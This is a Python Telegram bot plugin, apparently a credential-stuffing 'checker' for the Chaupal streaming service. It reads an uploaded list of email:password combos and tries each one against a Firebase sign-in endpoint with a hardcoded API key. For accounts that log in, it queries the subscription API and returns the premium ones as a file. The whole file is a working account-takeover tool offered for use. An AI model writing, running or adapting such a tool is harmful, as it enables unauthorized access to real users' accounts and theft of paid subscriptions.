import requests
import os
from pyrogram import Client, filters
from pyrogram.types import Message
from tqdm import tqdm

API_KEY = 'AIzaSyCy9pm1PChZKOULywz9FBV1QD8MLZFc35c'
AUTH_URL = f'https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}'
SUBSCRIPTION_URL = 'https://content.chaupal.tv/payments/subscription'


@Client.on_message(filters.command("chaupal"))
async def chaupal_helper_command(app: Client, message: Message):
    status = await message.reply_text('<i>Checking Chaupal...</i>')
    try:
        if message.reply_to_message and message.reply_to_message.document:
            document = await app.download_media(message.reply_to_message.document)
            combos = []
            with open(document, 'r') as file:
                for line in file:
                    combo = line.strip()
                    combos.append(combo)
            os.remove(document)
        else:
            await status.edit_text(text='<b>Please reply with a valid combo.txt file😡.</b>')
            return

        total_combos = len(combos)
        checked_combos = 0
        success_count = 0
        error_count = 0
        premium_accounts = []
        with tqdm(combos, desc='Checking combos', unit='combo', ncols=80) as progress_bar:
            for combo in progress_bar:
                combo_split = combo.split(':')
                if len(combo_split) != 2:
                    continue

                email = combo_split[0]
                password = combo_split[1]

                auth_data = {
                    "returnSecureToken": True,
                    "email": email,
                    "password": password
                }
                auth_response = requests.post(AUTH_URL, json=auth_data)
                auth_data = auth_response.json()

                checked_combos += 1

                if 'idToken' in auth_data:
                    id_token = auth_data['idToken']

                    headers = {'Authorization': f'Bearer {id_token}'}
                    subscription_response = requests.get(
                        SUBSCRIPTION_URL, headers=headers)

                    if subscription_response.status_code == 200:
                        subscription_data = subscription_response.json()

                        if 'plan' in subscription_data:
                            plan_name = subscription_data['planMetadata'].get(
                                'name')
                            premium_accounts.append(
                                f"{combo} [Plan Name: {plan_name}]")
                            success_count += 1

                    else:
                        error_count += 1

        if premium_accounts:
            premium_text = '\n'.join(premium_accounts)
            with open('Chaupal_premium.txt', 'w') as file:
                file.write(premium_text)
            await app.send_document(message.chat.id, 'Chaupal_premium.txt')
            os.remove('Chaupal_premium.txt')

        message_text = (
            f'<b>Checked Combos:</b> {checked_combos}/{total_combos}\n'
            f'<b>Success Count:</b> {success_count}\n'
            f'<b>Error Count:</b> {error_count}'
        )
        await status.edit_text(text=message_text)

    except requests.exceptions.RequestException as e:
        print(f"An error occurred during the request: {e}")
        await status.edit_text(text="<b>An error occurred during the request. Please try again later.</b>")

    except KeyError:
        print("Failed to parse the response JSON.")
        await status.edit_text(text="<b>Failed to parse the response JSON. Please try again later.</b>")
